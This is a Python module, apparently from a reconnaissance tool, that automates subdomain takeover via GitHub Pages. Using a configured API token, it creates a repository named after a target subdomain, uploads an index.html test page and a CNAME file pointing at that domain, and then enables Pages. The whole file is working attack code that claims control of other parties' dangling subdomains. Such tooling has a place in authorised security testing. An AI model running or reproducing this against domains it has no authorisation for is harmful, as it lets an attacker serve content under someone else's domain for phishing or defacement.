#!/usr/bin/env python3
# coding=utf-8

"""
github自动接管
"""

import json
import base64
import requests
from config import settings

HEADERS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/63.0.3239.84 Safari/537.36",
}


def github_takeover(url):
    # 读取config配置文件
    repo_name = url
    print('[*]正在读取配置文件')
    user = settings.github_api_user
    token = settings.github_api_token
    headers = {
        "Authorization": 'token ' + token,
        "Accept": "application/vnd.github.switcheroo-preview+json"
    }
    repos_url = 'https://api.github.com/repos/' + user + '/' + repo_name
    repos_r = requests.get(url=repos_url, headers=headers)
    # 验证token是否正确
    if 'message' in repos_r.json():
        if repos_r.json()['message'] == 'Bad credentials':
            print('[*]请检查Token是否正确')
        elif repos_r.json()['message'] == 'Not Found':
            print('[*]正在生成接管库')  # 生成接管库
            creat_repo_dict = {
                "name": repo_name,
                "description": "This is a subdomain takeover Repository",
            }
            creat_repo_url = 'https://api.github.com/user/repos'
            creat_repo_r = requests.post(url=creat_repo_url,
                                         headers=headers,
                                         data=json.dumps(creat_repo_dict))
            creat_repo_status = creat_repo_r.status_code
            if creat_repo_status == 201:
                print('[*]创建接管库' + repo_name + '成功，正在进行自动接管')
                # 接管文件生成
                # index.html文件
                html = b'''
                <html>
                    <p>Subdomain Takerover Test!</>
                </html>
                '''
                html64 = base64.b64encode(html).decode('utf-8')
                html_dict = {
                    "message": "my commit message",
                    "committer": {
                        "name": "user",  # 提交id，非必改项
                        "email": "user@163.com"  # 同上
                    },
                    "content": html64
                }
                # CNAME文件
                cname_url = bytes(url, encoding='utf-8')
                cname_url64 = base64.b64encode(cname_url).decode('utf-8')
                url_dict = {
                    "message": "my commit message",
                    "committer": {
                        "name": "user",
                        "email": "user@163.com"
                    },
                    "content": cname_url64
                }
                base_url = 'https://api.github.com/repos/'
                html_url = base_url + user + '/' + repo_name + '/contents/index.html'
                url_url = base_url + user + '/' + repo_name + '/contents/CNAME'
                html_r = requests.put(url=html_url, data=json.dumps(html_dict),
                                      headers=headers)  # 上传index.html
                cname_r = requests.put(url=url_url, data=json.dumps(url_dict),
                                       headers=headers)  # 上传CNAME
                rs = cname_r.status_code
                if rs == 201:
                    print('[*]生成接管库成功，正在开启Github pages')
                    page_url = "https://api.github.com/repos/" + user + "/" + url + "/pages"
                    page_dict = {
                        "source": {
                            "branch": "master"
                        }
                    }
                    page_r = requests.post(url=page_url,
                                           data=json.dumps(page_dict),
                                           headers=headers)  # 开启page
                    if page_r.status_code == 201:
                        print('[+]自动接管成功，请稍后访问http://' + str(url) + '查看结果')
                    else:
                        print('[+]开启Github pages失败，请检查网络或稍后重试')
                else:
                    print('[+]生成接管库失败，请检查网络或稍后重试')
    elif url in repos_r.json()['name']:
        print('[*]生成接管库失败，请检查https://github.com/' + user +
              '?tab=repositories是否存在同名接管库')
